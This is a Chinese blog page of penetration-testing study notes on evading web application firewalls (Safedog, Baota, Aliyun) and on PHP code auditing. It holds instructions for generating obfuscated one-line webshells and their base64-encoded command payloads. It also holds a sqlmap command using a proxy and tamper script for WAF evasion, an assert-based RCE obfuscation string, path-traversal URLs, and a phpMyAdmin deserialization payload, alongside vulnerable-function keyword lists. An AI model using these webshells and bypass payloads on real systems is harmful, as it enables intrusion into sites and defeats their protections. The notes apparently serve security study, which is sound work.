<p>地址：https://www.phpjiami.com/phpjiami.html</p>
<p>木马加密前后对比：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095046111.png" alt="" loading="lazy"><br>
成功<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095052011.png" alt="" loading="lazy"><br>
<strong>案例4：safedog,BT,Aliyun-基于覆盖加密变异下编码解码绕过-代码层</strong></p>
<p>venom：支持生成asp、aspx、jsp、php等一句话免杀木马</p>
<p>下载：https://pan.baidu.com/s/1msqO2kps139NNP9ZEIAVHw 提取码：xiao<br>
这个项目原来在github上，后来被移除了。发现gitee上也有Webshell-venom，<br>
地址：https://gitee.com/Dyan_code/webshell-venom?_from=gitee_search</p>
<pre><code>## 使用方法
```
python3 php_venom_3.3.py    //生成免杀一句话
    
python3 php_venom_3.3.py shell.php   //对同目录下shell.php进行免杀处理，结果保存在shell.php.bypass.php
```
    
## 3.x 使用说明：

是否传入id参数决定是否把流量编码

```
http://www.xxx.com/shell.php 
POST: mr6=phpinfo();  //与普通shell相同

http://www.xxx.com/shell.php?id=xxx(xxxx随便修改)
POST: mr6=cGhwaW5mbygpOwo=  //payload的base64编码
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636095059217.png" alt="" loading="lazy"><br>
测试，成功。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095065591.png" alt="" loading="lazy"></p>
<p><strong>Safedog,BT,Aliyun-基于冰蝎新型控制器绕过全面测试-行为层</strong></p>
<p>3个工具比较：</p>
<p>菜刀：已经不再更新了，无插件（看举例1），单向加密传输，打5分，不建议使用。<br>
蚁剑：持续更新状态，有插件，扩展性强，缺点是单向加密传输，打8分。<br>
冰蝎：持续更新状态，未知插件，扩展性强，双向加密传输，偏向于后渗透，可以联动msf.，打分9分，推荐使用。<br>
下载地址：</p>
<p>冰蝎：https://github.com/rebeyond/Behinder/releases/<br>
蚁剑：https://github.com/AntSwordProject/antSword/releases</p>
<p>举例1：菜刀工具没有base64编码解码功能，所以就无法通过编码绕过宝塔，但是蚁剑可以，如下图所示。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095070501.png" alt="" loading="lazy"></p>
<p>单向加密传输VS双向加密传输：</p>
<p>单向加密传输：请求参数加密，响应不加密。<br>
双向加密传输：请求加密，响应加密，更好地保护数据传输，防止waf拦截被杀。<br>
冰蝎双向加密传输原理：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095076348.png" alt="" loading="lazy"></p>
<p>冰蝎-双向加密传输-抓包查看<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095082043.png" alt="" loading="lazy"></p>
<p><strong>Safedog,BT,Aliyun-基于手写新型控制器绕过全面测试-行为层</strong><br>
使用工具连接木马时，waf可能会通过工具的指纹实现拦截，此时我们可以采用如下方法绕过：1、指纹变异、2、自己造轮子</p>
<p>举例如下，自己写脚本模拟工具</p>
<pre><code>http://test.xxx.com/xx.php?x=b&amp;y=assert
post data举例：
执行代码 z=phpinfo(); --&gt;  z=cGhwaW5mbygpOw==
写入文件 z=file_put_contents(&quot;test.txt&quot;,&quot;1&quot;); --&gt;  z=ZmlsZV9wdXRfY29udGVudHMoInRlc3QudHh0IiwiMSIpOw==
读取文件 z=var_dump(scandir(&quot;.&quot;)); --&gt;  z=dmFyX2R1bXAoc2NhbmRpcigiLiIpKTs=
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636095089441.png" alt="" loading="lazy"><br>
测试，成功。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095096194.png" alt="" loading="lazy"><br>
涉及其他资源：</p>
<p>1、wsexplorer抓包工具<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095101787.png" alt="" loading="lazy"></p>
<p>2、超级加解密转换工具<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095106138.png" alt="" loading="lazy"></p>
<p>涉及资源<br>
https://github.com/djunny/enphp<br>
https://www.phpjiami.com/phpjiami.html<br>
https://github.com/rebeyond/Behinder/releases/<br>
https://github.com/AntSwordProject/antSword/releases</p>
<p><strong>49.漏洞利用注入上传跨站等绕过</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093563436.png" alt="" loading="lazy"><br>
** 49.1 SQL 注入**<br>
如需 sqlmap 注入 修改 us 头及加入代理防 CC 拦截自写 tamper 模块<br>
安全狗：参考之前 payload<br>
Aliyun：基本修改指纹即可<br>
宝塔：匹配关键字外加/*等<br>
如需sqlmap注入测试，</p>
<p>防cc拦截：修改user-agent头+代理（付费代理池）<br>
修改user-agent头：<br>
（1）加参数：--random-agent<br>
（2）加参数：--user-agent=&quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot;<br>
各大搜索引擎的User-Agent：https://www.cnblogs.com/iack/p/3557371.html<br>
（3）修改配置文件sqlmap.conf中的agent变量值<br>
加代理：--proxy=&quot;http:tps123.kdlapi.com:15818&quot;<br>
绕过安全狗：自写tamper模块，参考如下waf-dog.py<br>
绕过Aliyun：基本修改指纹即可（修改user-agent头）<br>
绕过宝塔：匹配关键字外加/*等</p>
<figure data-type="image" tabindex="125"><img src="https://jinqipiaopiao.github.io//post-images/1636093568217.png" alt="" loading="lazy"></figure>
<pre><code>python sqlmap.py -u &quot;http://test.xiaodi8.com/sqlilabs/Less-2/?id=1&quot; --proxy=&quot;http:tps123.kdlapi.com:15818&quot; --tamper=&quot;waf-dog.py&quot; --random-agent
</code></pre>
<p>waf-dog.py：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095492228.jpg" alt="" loading="lazy"><br>
在买了宝塔付费产品后，过狗的payload中含有/*的都会被宝塔拦截。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636095483018.png" alt="" loading="lazy"><br>
可以使用%00截断来绕过。</p>
<p>修改脚本，在使用/*的时候在前面加上%00<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095476384.png" alt="" loading="lazy"><br>
另外，抓包查看sqlmap的指纹如下，会被waf拦截，所以需要修改us头。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095468936.png" alt="" loading="lazy"></p>
<p><strong>49.2 文件上传</strong><br>
1.php 截断 参考前面上传 waf 绕过 payload</p>
<p><strong>49.3 XSS 跨站</strong><br>
利用 XSStrike 绕过 加上–timeout 或–proxy 绕过 cc</p>
<p><strong>49.4 其他集合</strong><br>
RCE<br>
加密加码绕过？算法可逆？关键字绕过？提交方法？各种测试！</p>
<pre><code>txt=$y=str_replace('x','','pxhpxinxfo()');assert($y);&amp;submit=%E6%8F%90%E4%BA%A4

文件包含：没什么好说的就这几种
…\ …/ …\
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636095460893.jpg" alt="" loading="lazy"><br>
————————————————<br>
版权声明：本文为CSDN博主「进击的网安攻城狮」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_41665162/article/details/119827651</p>
<h1 id="2021-11-08">2021-11-08</h1>
<h1 id="代码审计-php无框架项目sql注入挖掘技巧">代码审计-php无框架项目sql注入挖掘技巧</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636335937027.png" alt="" loading="lazy"><br>
<strong>代码审计</strong><br>
1.教学计划：审计项目漏洞Demo-》审计思路-》完整源码框架-》验证并利用漏洞<br>
2.教学内容：php，java网站应用，引入框架类开发源码，相关审计工具以及插件使用<br>
3.必备知识顶啊：环境安装搭建使用，相关工具插件安装使用，掌握前期使用各种原理以及利用<br>
4.开始前准备：审计目标的的程序名，版本，当前环境（系统，中间件，脚本语言等信息）各种插件等<br>
5.挖掘漏洞跟本：可控变量以及特定函数，不存在过滤不严谨存在绕过导致的安全漏洞<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636335933373.png" alt="" loading="lazy"><br>
<strong>代码审计思路</strong><br>
<strong>1.定点挖掘关键字：</strong><br>
可控变量-变量接受get，post，接受关键字<code>$_GET</code><br>
特定函数-输出print，数据库操作等<br>
特定关键字<br>
sql注入漏洞-》搜索 select\insert\update\sql执行语句<br>
xss漏洞--&gt;搜索echo\print等<br>
安全漏洞--&gt;搜索<code>$_GET$POST</code>等<br>
<strong>2.定点挖掘功能点</strong><br>
如果挖掘文件上传，会员中心存在文件上传的操作地址，抓包分析找到源码中的特定文件代码段，进行文件上传代码分析挖掘<br>
<strong>3.挖掘，视漏洞而定：举例</strong><br>
SQL注入 数据库监控-监控到当前页面和数据库的交互过程（sql执行语句）<br>
断定啊调试：访问页面对应代码进行断点调试（执行过程前后顺序，调用文件列表）<br>
可使用seay源代码审计系统进行数据库监控，全局搜索关键字等（）<br>
下载：https://github.com/f1tz/cnseay）<br>
动态调试|Maccms SQL 注入分析(附注入盲注脚本)：https://www.cnblogs.com/ichunqiu/p/9548754.html<br>
双重编码绕过：源代码将%5c自动转为\，%25%35%63 转为%5c get出url编码<br>
二次注入</p>
<p>原理：绕过转义注入 魔术引号<br>
满足条件： 有insert update （必须是有插入到数据库中的操作） 、可控变量</p>
<pre><code>注册用户：insert xiaodi union select'
过滤： xiaodi union select\'
进入数据库： xiaodi union select'
修改用户：update xiaodi union select' 条件=用户名是谁 xiaodi' union select update注入
</code></pre>
<figure data-type="image" tabindex="126"><img src="https://jinqipiaopiao.github.io//post-images/1636335928041.jpg" alt="" loading="lazy"></figure>
<h1 id="五十一代码审计-php框架mvc类上传断点调试挖掘">五十一：代码审计-PHP框架MVC类上传断点调试挖掘</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636336173988.png" alt="" loading="lazy"><br>
知识点 1：<br>
#关键字搜索：(函数，键字，全局变量等)<br>
文件上传，$_FILES，move_uploaded_file 等<br>
#应用功能抓包：（任何可能存在上传的应用功能点）<br>
前台会员中心，后台新闻添加等可能存在上传的地方</p>
<p>知识点 2：<br>
MVC 开发框架类：https://www.cnblogs.com/wsybky/p/8638876.html</p>
<p>知识点 3：<br>
Thinkphp 框架：https://sites.thinkphp.cn/1556331<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636336146388.png" alt="" loading="lazy"></p>
<h1 id="52-php项目类rcea及文件包含下载删除">52. PHP项目类RCEA及文件包含下载删除</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636336249038.png" alt="" loading="lazy"><br>
漏洞关键字：</p>
<p>**    SQL 注入：**</p>
<pre><code>select insert update mysql_query mysqli 等
</code></pre>
<p>**    文件上传：**</p>
<pre><code>$_FILES，type=&quot;file&quot;，上传，move_uploaded_file()等
</code></pre>
<p>**    XSS 跨站：**</p>
<pre><code>print print_r echo sprintf die var_dump var_export 等
</code></pre>
<p>**    文件包含：**</p>
<pre><code>include include_once require require_once 等
</code></pre>
<p>**    代码执行：**</p>
<pre><code>eval assert preg_replace call_user_func call_user_func_array 等
</code></pre>
<p>**    命令执行：**</p>
<pre><code>system exec shell_exec `` passthru pcntl_exec popen proc_open
</code></pre>
<p>**    变量覆盖：**</p>
<pre><code>extract() parse_str() importrequestvariables() $$等
</code></pre>
<p>**    反序列化：**</p>
<pre><code>serialize() unserialize() __construct __destruct 等
</code></pre>
<p>**    其他漏洞：**</p>
<pre><code>unlink() file_get_contents() show_source() file() fopen()等
</code></pre>
<p>**    通用关键字：**<br>
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">_GET,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mpunct">,</span></span></span></span>_POST,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>R</mi></msub><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><mi>T</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">_REQUEST,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mpunct">,</span></span></span></span>_FILES,$_SERVER 等<br>
功能点或关键字分析可能存在漏洞<br>
抓包或搜索关键字找到代码出处及对应文件<br>
追踪过滤或接受的数据函数，寻找触发此函数或代码的地方进行触发测试</p>
<pre><code>http://192.168.0.102:91/?r=../../index.txt%00
http://192.168.0.102:94/admin/save.php?act=delfile
path=/upload/../install/install.lock
</code></pre>
<p>演示案例：<br>
xhcms-无框架-文件包含跨站-搜索或应用-include<br>
通过应用及 URL 地址等分析可能存在 xss 及包含安全<br>
抓包找到 XSS 无过滤代码块及文件包含有后缀需绕过代码块</p>
<p>earmusic-无框架-文件下载-搜索或应用功能-down<br>
通过应用分析或搜索判断可能存在文件下载操作<br>
抓包分析下载地址找到对应代码块，文件下载地址由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">制</mi></mrow><annotation encoding="application/x-tex">file 控制
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">制</span></span></span></span>file 从数据库查询语句得知，追踪那里可更新或更改此类数据<br>
尝试修改发现过滤，追踪过滤机制分析绕过，采用全路径地址绕过</p>
<h1 id="53代码审计-tp5框架及无框架变量覆盖反序列化">53:代码审计-TP5框架及无框架变量覆盖反序列化</h1>
<p><strong>案例1：metinfo-无框架-变量覆盖-自动审计或搜索</strong></p>
<p>变量覆盖配合文件包含实现任意文件包含</p>
<p>自动审计或搜索关键字找到文件及代码块，全局配置文件</p>
<p>变量覆盖漏洞关键字：extract()、parse_str()、importrequestvariables()、$$等<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370469321.jpg" alt="" loading="lazy"><br>
如下代码，表示从get post cookie接收数据，进行变量覆盖<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370474402.jpg" alt="" loading="lazy"><br>
<strong>搜索或访问触发全局变量配置文件配合手写代码测试变量覆盖</strong></p>
<p>原理如下图所示<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370479421.jpg" alt="" loading="lazy"><br>
<strong>配合文件包含漏洞覆盖指定文件实现文件包含攻击获取权限</strong></p>
<p>追踪$module变量出处文件，然后分析如何覆盖它达到目的</p>
<pre><code>payload：/about/index.php?fmodule-7&amp;module-1.txt
</code></pre>
<figure data-type="image" tabindex="127"><img src="https://jinqipiaopiao.github.io//post-images/1636370484006.jpg" alt="" loading="lazy"></figure>
<p><strong>附：代码审计-MetInfo CMS变量覆盖漏洞</strong></p>
<p>https://www.cnblogs.com/-qing-/p/10889100.html</p>
<p>DeDecms变量覆盖之SQL语句分析报告+修复方案</p>
<p>https://www.cnblogs.com/y0umer/archive/2013/06/08/3125647.html</p>
<p><strong>案例2：phpmyadmin-无框架-反序列化-自动审计或搜索</strong></p>
<p>#反序列化--&gt;自动审计或搜索关键字找到文件及代码段</p>
<pre><code>_wakeup() //使用unserialize时触发
_sleep() //使用serialize时触发
_destruct() //对象被销毁时触发
_call() //在对象上下文中调用不可访问的方法时触发
_callStatic() //在静态上下文中调用不可访问的方法时触发
_get() //用于从不可访问的属性读取数据
_set() //用于将数据写入不可访问的属性
_isset() //在不可访问的属性上调用isset()或empty()触发
_unset() //在不可访问的属性上使用unset()时触发
_toString() //把类当做字符串使用时触发
_invoke() //当脚本尝试将对象调用为函数时触发
</code></pre>
<p>payload：/about/index.php?fmodule-7&amp;module-1.txt<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370490126.jpg" alt="" loading="lazy"><br>
首先全局搜索unserialize<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370494264.jpg" alt="" loading="lazy"><br>
全局搜索PMA_Config()找到_wakeup()代码段，代码段调用函数中存在eval等函数操作，可调试load<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370503000.jpg" alt="" loading="lazy"><br>
构造getSource()利用payload，实现file_get_contents函数配合eval执行<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370507972.jpg" alt="" loading="lazy"></p>
<pre><code>payload：action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:{s:6:&quot;source&quot;,s:11:&quot;d:/test.txt&quot;;}
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636370512955.jpg" alt="" loading="lazy"><br>
<strong>案例3：Thinkphp5-有框架-搭建使用入口访问调试sql等</strong></p>
<p>Thinkphp5简要知识点</p>
<p>入口文件，调试模式，访问路由，访问对应，内置安全等<br>
测试访问不同方法名，不同文件不同方法名（https://www.kancloud.cn/thinkphp/thinkphp5_quickstart/478279）<br>
其他参考：ThinkPHP5快速入门:https://www.kancloud.cn/thinkphp/thinkphp5_quickstart<br>
<strong>测试常规写法SQL注入</strong></p>
<p>源代码-查询数据库常规写法<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370517844.jpg" alt="" loading="lazy"><br>
测试，有sql注入<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370522653.jpg" alt="" loading="lazy"><br>
测试TP5规定写法SQL注入</p>
<p>源代码-使用框架定义写法查询数据库<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370535448.png" alt="" loading="lazy"><br>
打开调试模式<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370539565.jpg" alt="" loading="lazy"><br>
测试，尝试sql注入，发现注入语句并未执行，说明thinkphp框架有内置的注入安全过滤。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370544838.jpg" alt="" loading="lazy"><br>
此时，如果我们想挖sql注入漏洞，那就相当于挖框架漏洞而不是系统漏洞。</p>
<p>thinkphp历史漏洞集合：https://github.com/Mochazz/ThinkPHP-Vuln</p>
<p>从中我们找到了该版本存在SQL注入漏洞，使用payload测试<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636370555691.jpg" alt="" loading="lazy"></p>

            </div>
          </article>
        </div>
        <div class="paper" data-aos="fade-in">
          
            <div class="next-post">
              <div class="next">
                下一篇
              </div>
              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">
                <h3 class="post-title">
                  暑假学习笔记记录
                </h3>
              </a>
            </div>
          
        </div>
        
      </div>

      <div class="sm-12 md-4 col sidebar">
  <div class="paper info-container">
    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1638358535496" class="no-responsive avatar">
    <div class="text-muted">温故而知新</div>
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
  </div>
  <div class="paper">
    <div class="sidebar-title">
      最新文章
    </div>
    <div class="row">
      <ul>
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/mian-shi/">面试</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/yong-heng-zhi-lan-li-yong/">永恒之蓝利用</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/owasp/">OWASP</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/php-yuan-cheng-rce-lou-dong-fu-xian-yi-ji-lun-xian-zhu-ji-ru-qin-su-yuan-fen-xi/">PHP远程RCE漏洞复现以及沦陷主机入侵溯源分析</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/wpscan/">wpscan</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/hui-bian-yu-yan/">汇编语言</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/qian-tan-wen-jian-shang-chuan-lou-dong/">浅谈文件上传漏洞</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/chang-jian-de-jie-xi-lou-dong-zong-jie/">常见的解析漏洞总结</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/2021-9-4-kai-xue-bi-ji/">2021-9-4开学笔记</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">暑假学习笔记记录</a>
            </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </div>
  </div>
  <div class="paper">
    <div class="sidebar-title">
      标签列表
    </div>
    <div class="row">
      
        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge success">
          Gridea
        </a>
      
    </div>
  </div>
  <div class="paper">
    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">RSS</a>
  </div>
</div>


    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>

<script type="application/javascript">

AOS.init();

hljs.initHighlightingOnLoad()

</script>




  </body>
</html>
